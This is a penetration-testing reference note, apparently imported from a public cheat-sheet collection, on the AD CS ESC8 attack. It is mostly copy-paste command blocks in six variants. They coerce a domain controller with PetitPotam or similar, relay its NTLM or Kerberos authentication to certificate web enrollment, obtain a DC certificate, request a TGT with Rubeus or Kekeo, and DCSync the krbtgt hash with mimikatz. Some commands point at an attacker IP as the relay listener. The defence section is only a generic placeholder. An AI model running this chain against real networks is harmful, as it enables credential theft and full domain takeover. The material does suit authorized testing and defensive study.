---
title: Active Directory - Certificate ESC8
type: technique
tags: [active-directory, adcs, certificates, esc8, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC8

## What it is

> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

## How it works

ESC8 exploits the AD CS HTTP enrollment endpoint (`/certsrv/`), which supports NTLM authentication but lacks relay protections. An attacker triggers a Domain Controller to authenticate outbound using a coercion primitive like PetitPotam or PrintSpooler, then relays the DC's NTLM credentials to the web enrollment interface to request a Domain Controller certificate. The resulting certificate can be used to request a Kerberos TGT for the DC machine account via PKINIT, enabling DCSync and full domain compromise.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC8 - Web Enrollment Relay

> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101

* **Version 1**: NTLM Relay + Rubeus + PetitPotam

```powershell
impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
# For a member server or workstation, the template would be "Computer".
# Other templates: workstation, DomainController, Machine, KerberosAuthentication

# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

# Use the certificate with rubeus to request a TGT
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

# Now you can use the TGT to perform a DCSync
mimikatz> lsadump::dcsync /user:krbtgt
```

* **Version 2**: NTLM Relay + Mimikatz + Kekeo

```powershell
impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Mimikatz
mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth

# Kekeo
kekeo> base64 /input:on
kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt

# Mimikatz
mimikatz> lsadump::dcsync /user:krbtgt
```

* **Version 3**: Kerberos Relay

```ps1
# Setup the relay
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

# Run mitm6
sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
```

* **Version 4**: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.

```powershell
https://github.com/bats3c/ADCSPwn
adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local

# ADCSPwn arguments
adcs            -       This is the address of the AD CS server which authentication will be relayed to.
secure          -       Use HTTPS with the certificate service.
port            -       The port ADCSPwn will listen on.
remote          -       Remote machine to trigger authentication from.
username        -       Username for non-domain context.
password        -       Password for non-domain context.
dc              -       Domain controller to query for Certificate Templates (LDAP).
unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
output          -       Output path to store base64 generated crt.
```

* **Version 5**: Certipy ESC8

```ps1
certipy relay -ca 172.16.19.100
```

* **Version 6**: Kerberos Relay (self relay in case of only one DC)

```ps1
# Add dns entry with the james forshaw's trick
dnstool.py -u "domain.local\user" -p "password" -r "computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp

# Coerce kerberos with petit potam on dns entry
petitpotam.py -u 'user' -p 'password' -d domain.local 'computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' computer.domain.local

# relay kerberos
python3 krbrelayx.py -t 'http://computer.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'COMPUTER$' -ip 10.10.10.10
```

## References

* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [AD CS relay attack - practical guide - @exandroiddev - June 23, 2021](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[certipy]]
- [[impacket]]
- [[mimikatz]]
- Also uses (no dedicated page yet): Rubeus

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
